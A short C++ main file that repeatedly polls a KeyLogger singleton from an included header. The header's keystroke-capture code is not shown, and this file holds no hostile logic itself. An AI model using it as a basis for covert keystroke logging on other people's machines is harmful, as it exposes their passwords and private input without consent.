#include <iostream>
#include "KeyLoger.hpp"

int main(int argc, char **argv)
{
	while (KeyLogger::getInstance().refreshNonBlocking())
	{

	}
	return 0;
}